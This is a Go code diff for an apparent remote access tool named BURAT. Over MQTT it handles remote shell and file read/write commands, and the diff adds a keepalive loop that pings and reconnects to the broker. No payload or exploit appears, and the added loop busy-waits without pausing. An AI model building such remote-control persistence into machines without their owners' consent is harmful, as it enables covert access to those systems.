@@ -6,6 +6,7 @@ import (
 	"./burat"
 	"./packets"
 	"github.com/eclipse/paho.mqtt.golang"
+	"time"
 )
 
 func main() {
@@ -40,9 +41,6 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		"filerw_evt_write":				"bu/bushi/BURAT/bushido/filerw/+/evt/write",
 		"filerw_evt_error":				"bu/bushi/BURAT/bushido/filerw/+/evt/error",
 	})
-
-	burat.MqttConfig("tcp://localhost:1883")
-	burat.Connect()
 
 	burat.AddTopicCallback("remoteshell_cmd_open", func (client mqtt.Client, message mqtt.Message) {
 		var packet packets.RemoteShellOpenPacket
@@ -188,7 +186,17 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		burat.Publish(id, "filerw_evt_error", 2, false, packet)
 	})
 
+	lastPingTime := time.Now()
 	for {
-
+		if burat.Internals().Mqtt.IsConnected() {
+			if time.Since(lastPingTime).Seconds() >= 60 {
+				burat.Ping()
+				lastPingTime = time.Now()
+			}
+		} else {
+			if !burat.Connecting() {
+				burat.Connect()
+			}
+		}
 	}
 }
